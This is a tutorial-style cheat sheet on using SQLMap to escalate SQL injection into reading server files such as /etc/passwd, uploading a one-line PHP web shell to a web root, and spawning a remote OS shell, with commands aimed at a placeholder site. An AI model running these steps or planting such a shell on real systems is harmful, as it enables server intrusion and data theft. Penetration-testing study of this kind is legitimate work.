SQLMap can escalate SQL injection attacks to gain **file system access** or even **command execution** on the underlying operating system—depending on privileges.

---

### **1. File Read / Write via SQL Injection**

####  **Reading Files**

- File read access depends on:
    - **DBMS support** (e.g., MySQL’s `LOAD DATA LOCAL INFILE`)
    - **Privileges** of the DB user
    - **DBA rights** (not always required but helps)

Check for DBA Privileges:
```bash
sqlmap -u "http://example.com/?id=1" --is-dba
```

Read Local Files (e.g., /etc/passwd):
```bash
sqlmap -u "http://example.com/?id=1" --file-read="/etc/passwd"
```

#### **Writing Files**

- Modern DBMSes **restrict file writing** to avoid exploitation.
- Requirements:
    - **DBA privileges**
    - **Writable directory** (e.g., `/var/www/html`)
    - `secure_file_priv` must allow writing (in MySQL)

**Steps:**
1. Prepare a shell:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
2. Upload the file:
```bash
sqlmap -u "http://example.com/?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```
3. Confirm remote access
```bash
curl http://example.com/shell.php?cmd=ls+-la
```

---

### **2. OS Command Execution**

SQLMap can **spawn an interactive shell** on the remote system if the conditions allow.

#### Basic usage:
```bash
sqlmap -u "http://example.com/?id=1" --os-shell
```

- SQLMap uses different techniques depending on DBMS:
    - Writes web shell
    - Uses **User Defined Functions (UDFs)** in MySQL
    - Uses **xp_cmdshell** in MSSQL

#### If output fails (e.g., with UNION-based SQLi), specify a technique:
```bash
sqlmap -u "http://example.com/?id=1" --os-shell --technique=E
```
#### Prompts during `--os-shell`:

- **Language** (default: PHP)
- **Web root directory** (auto-detect via common locations)

 Add `--batch` to skip prompts and use defaults.

---

### **Summary: Key SQLMap Options for OS Exploitation**

|**Option**|**Function**|
|---|---|
|`--is-dba`|Check if current DB user has DBA privileges|
|`--file-read=PATH`|Read remote file to local system|
|`--file-write=FILE`|Write local file to remote system|
|`--file-dest=PATH`|Specify destination path for uploaded file|
|`--os-shell`|Spawn interactive remote OS shell|
|`--technique=E`|Use specific SQLi technique (e.g., Error-based)|
|`--batch`|Auto-confirm prompts with default answers|
